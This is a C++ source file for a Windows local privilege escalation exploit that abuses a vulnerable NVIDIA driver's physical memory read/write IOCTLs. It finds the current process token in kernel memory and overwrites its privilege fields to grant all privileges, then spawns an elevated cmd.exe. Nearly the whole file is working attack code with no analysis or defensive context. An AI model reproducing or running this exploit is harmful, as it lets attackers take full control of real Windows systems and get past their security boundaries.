#include "NVDrv.h"
#include <fstream>
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")



typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION // Size=20
{
	ULONG NumberOfHandles; // Size=4 Offset=0
	SYSTEM_HANDLE Handles[1]; // Size=16 Offset=4
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

#define DRIVER_UNLOCK		0x222004
#define MEM_GETPHYSICAL		0x222080
#define MEM_READPHYSICAL	0x222084
#define MEM_WRITEPHYSICAL	0x222088

SIZE_T TokenId = 0x0;










SIZE_T GetHandleAddress(ULONG dwProcessId, SIZE_T hObject)
{
	DWORD dwHandleSize = 4096 * 16 * 16;
	BYTE* HandleInformation;
	DWORD BytesReturned;
	ULONG i;

	HandleInformation = (BYTE*)malloc(dwHandleSize);

	// Get handle information
	while (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16, HandleInformation, dwHandleSize, &BytesReturned) != 0)
		HandleInformation = (BYTE*)realloc(HandleInformation, dwHandleSize *= 2);

	// Find handle
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO) & HandleInfo->Handles[0];

	for (i = 0; i < HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		if (CurrentHandle->UniqueProcessId == dwProcessId &&
			CurrentHandle->HandleValue == (SIZE_T)hObject)
		{
			return (SIZE_T)CurrentHandle->Object;
		}
	}

	return NULL;
}


SIZE_T GetProcessToken()
{
	SIZE_T dwToken;
	HANDLE hToken;

	if (!OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()), TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken)) {
		printf("[-] Failed to get token!\n");
		return -1;
	}

	dwToken = (SIZE_T)hToken & 0xffff;
	dwToken = GetHandleAddress(GetCurrentProcessId(), dwToken);

	return dwToken;
}

// populate token id
DWORD FetchTokenId()
{
	PTOKEN_STATISTICS tokenstat;
	HANDLE hToken;
	DWORD dwSize;

	OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()), TOKEN_ALL_ACCESS, &hToken);

	GetTokenInformation(hToken, TokenStatistics, 0, 0, &dwSize);
	tokenstat = (PTOKEN_STATISTICS)malloc(dwSize);
	GetTokenInformation(hToken, TokenStatistics, tokenstat, dwSize, &dwSize);

	TokenId = tokenstat->TokenId.LowPart;
	printf("Token LUID is %08x\n", TokenId);

	CloseHandle(hToken);
	free(tokenstat);
	return TokenId;
}

SIZE_T FindTokenAddress(NVDrv* nvd,SIZE_T VirtualAddress)
{
	SIZE_T uStartAddr = 0x10000000, hTokenAddr = 0x0;
	LPVOID Allocation;

	printf("Token Virtual: %10x\n", VirtualAddress);

	// iterate over VA byte index
	uStartAddr = uStartAddr + (VirtualAddress & 0xfff);

	for (USHORT chunk = 0; chunk < 0xb; ++chunk) {
		Allocation = VirtualAlloc(0, 0x10000000, MEM_COMMIT, PAGE_READWRITE);
		nvd->ReadPhysicalMemory(uStartAddr, (uintptr_t*)(Allocation),0x10000000);
		for (SIZE_T i = 0; i < 0x10000000; i += 0x1000, uStartAddr += 0x1000) {
			if (memcmp(&Allocation + i, "User32 ", 8) == 0) {

				// we've got a user token with the same byte index, check the TokenID to confirm
				if (TokenId <= 0x0)
					FetchTokenId();

				if (*(DWORD*)((char*)Allocation + i + 0x10) == TokenId) {
					hTokenAddr = uStartAddr;
					break;
				}
			}
		}

		HeapFree(GetProcessHeap(), 0, Allocation);

		if (hTokenAddr > 0x0)
			break;
	}

	return hTokenAddr;
}


void WriteFileToDisk(const char* file_name, uintptr_t buffer, DWORD size)
{
	std::ofstream File(file_name, std::ios::binary);
	File.write((char*)buffer, size);
	File.close();
}

int main()
{
	
	NVDrv* NV = new NVDrv();
	

	unsigned char *TokenPrivs = (unsigned char*)0x0000001ff2ffffbc;

	SIZE_T uVTokenAddr = GetProcessToken();

	printf("Virtual: %10x\n", uVTokenAddr);


	SIZE_T uPTokenAddr = NV->MmGetPhysicalAddress(uVTokenAddr);
	printf("Physical: %10x\n", uPTokenAddr);
	printf("Physical offset @ %08x\n", uPTokenAddr + 0x40);
	if (uPTokenAddr <= 0x0)
		return -1;
	
	NV->WritePhysicalMemory(uPTokenAddr + 0x40, &TokenPrivs, sizeof(&TokenPrivs));

	NV->WritePhysicalMemory(uPTokenAddr + 0x48, &TokenPrivs, sizeof(&TokenPrivs));
	system("cmd.exe");
	return 0;
}
